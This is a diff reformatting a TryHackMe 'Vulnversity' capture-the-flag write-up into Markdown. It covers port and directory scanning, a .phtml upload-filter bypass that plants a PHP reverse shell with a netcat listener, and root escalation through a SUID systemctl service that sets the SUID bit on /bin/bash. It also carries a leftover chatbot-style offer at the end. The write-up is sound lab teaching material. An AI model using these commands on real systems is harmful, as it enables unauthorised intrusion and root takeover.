@@ -1,92 +1,252 @@
-TryHackMe: Vulnversity Write-up
-Challenge Overview
-Platform: TryHackMe
-Room: Vulnversity
-Category: Web Exploitation, Privilege Escalation
-Objective: Compromise a web server by exploiting a file upload vulnerability, then escalate privileges to root by abusing an SUID binary.
+# 🚀 TryHackMe: Vulnversity Write-up
 
-1. Reconnaissance
-Port Scanning
-We start by running an nmap scan to discover open ports and running services.
+## 📌 Challenge Overview
 
-Bash
+* **Platform:** TryHackMe
+* **Room:** Vulnversity
+* **Category:** Web Exploitation, Privilege Escalation
+* **Objective:**
+
+  * Exploit a file upload vulnerability to gain initial access
+  * Escalate privileges to **root** via SUID misconfiguration
+
+---
+
+## 🔍 1. Reconnaissance
+
+### 🛰️ Port Scanning
+
+We begin with an **Nmap scan** to identify open ports and services:
+
+```bash
 nmap -sC -sV -p- -oN nmap/initial <TARGET_IP>
-Results:
-The scan revealed 6 open ports:
+```
 
-Port 21: FTP (vsftpd 3.0.3)
+### 📊 Results
 
-Port 22: SSH (OpenSSH)
+| Port | Service | Version      |
+| ---- | ------- | ------------ |
+| 21   | FTP     | vsftpd 3.0.3 |
+| 22   | SSH     | OpenSSH      |
+| 139  | SMB     | NetBIOS      |
+| 445  | SMB     | NetBIOS      |
+| 3128 | Proxy   | Squid 3.5.12 |
+| 3333 | HTTP    | Apache       |
 
-Port 139 & 445: SMB/NetBIOS
+📌 The target appears to be running **Ubuntu**.
 
-Port 3128: Squid Proxy (Version 3.5.12)
+---
 
-Port 3333: HTTP (Apache web server)
+### 🌐 Web Enumeration
 
-The machine appears to be running Ubuntu based on the service versions.
+Accessing the web server:
 
-Web Enumeration
-Since there is a web server running on an unconventional port (3333), I navigated to http://<TARGET_IP>:3333. It presented a static university page.
+```
+http://<TARGET_IP>:3333
+```
 
-To find hidden directories, I ran gobuster:
+We find a static university page.
 
-Bash
-gobuster dir -u http://<TARGET_IP>:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-The scan uncovered a highly interesting directory: /internal/.
+#### 🔎 Directory Brute-force
 
-2. Initial Access
-Exploiting File Upload
-Navigating to http://<TARGET_IP>:3333/internal/ revealed a file upload form. My immediate goal was to upload a PHP reverse shell. However, attempting to upload a standard .php file resulted in an "Extension not allowed" error.
+```bash
+gobuster dir -u http://<TARGET_IP>:3333 \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
 
-Instead of using Burp Suite to fuzz the allowed extensions, I wrote a quick custom Python script using the requests library to automate the process and test various extensions (.php3, .php4, .php5, .phtml).
+✅ Discovered:
 
-The script iterated through the extensions and revealed that .phtml files were allowed by the server's filter.
+```
+/internal/
+```
 
-Gaining the Shell
-Grabbed the standard PHP reverse shell script from pentestmonkey.
+---
 
-Modified the IP and Port variables to point to my local machine.
+## 💥 2. Initial Access
 
-Renamed the payload to revshell.phtml and uploaded it.
+### 📤 Exploiting File Upload
 
-Set up a netcat listener:
+Navigating to:
 
-Bash
+```
+http://<TARGET_IP>:3333/internal/
+```
+
+We find a **file upload form**.
+
+* Uploading `.php` → ❌ Blocked
+* Bypass strategy → Test alternative extensions
+
+#### 🐍 Custom Python Script
+
+Used Python `requests` to fuzz extensions:
+
+```python
+extensions = [".php3", ".php4", ".php5", ".phtml"]
+```
+
+✅ Result:
+
+```
+.phtml → Allowed
+```
+
+---
+
+### 🐚 Gaining Reverse Shell
+
+1. Download reverse shell from PentestMonkey
+2. Modify attacker IP & port
+3. Rename file:
+
+```
+revshell.phtml
+```
+
+4. Upload payload
+
+#### 🎧 Start Listener
+
+```bash
 nc -lvnp 9001
-Navigated to http://<TARGET_IP>:3333/internal/uploads/revshell.phtml to trigger the execution.
+```
 
-This successfully popped a shell as the www-data user. I stabilized the shell using Python:
+#### ⚡ Trigger Shell
 
-Bash
+```
+http://<TARGET_IP>:3333/internal/uploads/revshell.phtml
+```
+
+✅ Got shell as:
+
+```
+www-data
+```
+
+---
+
+### 🧠 Stabilizing Shell
+
+```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
-From here, navigating to /home/bill/ allowed me to read the user.txt flag.
+```
 
-3. Privilege Escalation
-The next step was to escalate privileges to root. I started by searching the system for binaries with the SUID bit set, which allow files to be executed with the permissions of the file owner (root).
+---
 
-Bash
+### 🏁 User Flag
+
+```bash
+cd /home/bill
+cat user.txt
+```
+
+---
+
+## 🔐 3. Privilege Escalation
+
+### 🔍 Finding SUID Binaries
+
+```bash
 find / -type f -perm -4000 2>/dev/null
-Reviewing the output, /bin/systemctl stood out as highly unusual for an SUID binary.
+```
 
-Abusing systemctl
-To figure out how to exploit systemctl, I consulted GTFOBins. Since systemctl was running with SUID privileges, I could create a malicious system service to execute commands as root.
+🚨 Interesting finding:
 
-Instead of grabbing a reverse shell, I created a service unit file that changes the permissions of /bin/bash to make it an SUID binary itself:
+```
+/bin/systemctl
+```
 
-Bash
+---
+
+### ⚙️ Exploiting systemctl (SUID)
+
+Using **GTFOBins technique**, we create a malicious service.
+
+#### 🛠️ Create Service File
+
+```bash
 TF=$(mktemp).service
+
 echo '[Service]
 Type=oneshot
 ExecStart=/bin/sh -c "chmod +s /bin/bash"
 [Install]
 WantedBy=multi-user.target' > $TF
+```
+
+#### 🚀 Execute Service
+
+```bash
 /bin/systemctl link $TF
 /bin/systemctl enable --now $TF
-After executing the service, I checked the permissions of /bin/bash and confirmed the SUID bit (s) was now active.
+```
 
-I simply ran bash with the -p flag to retain the privileges:
+---
 
-Bash
+### 🔓 Root Access
+
+Check bash permissions:
+
+```bash
+ls -l /bin/bash
+```
+
+✅ SUID bit set
+
+Now escalate:
+
+```bash
 /bin/bash -p
-This dropped me into an effective root shell! I navigated to /root/ and grabbed the final root.txt flag.
+```
+
+🎉 **Root shell obtained!**
+
+---
+
+### 🏁 Root Flag
+
+```bash
+cd /root
+cat root.txt
+```
+
+---
+
+## 🧠 Key Takeaways
+
+* File upload filters can be bypassed using alternative extensions
+* Always test uncommon file extensions like `.phtml`
+* SUID misconfigurations are critical privilege escalation vectors
+* GTFOBins is an essential resource for exploitation
+
+---
+
+## 🛠️ Tools Used
+
+* Nmap
+* Gobuster
+* Netcat
+* Python (requests)
+* GTFOBins
+
+---
+
+## 📚 References
+
+* [https://gtfobins.github.io](https://gtfobins.github.io)
+* [https://tryhackme.com](https://tryhackme.com)
+
+---
+
+## ✍️ Author
+
+**Muhammad Taher**
+Cyber Security Enthusiast | CTF Player
+
+---
+
+If you want, I can also:
+
+* Add **badges (TryHackMe, difficulty, status)**
+* Make a **dark-themed README with shields.io**
+* Or convert this into a **portfolio-style write-up** 🔥
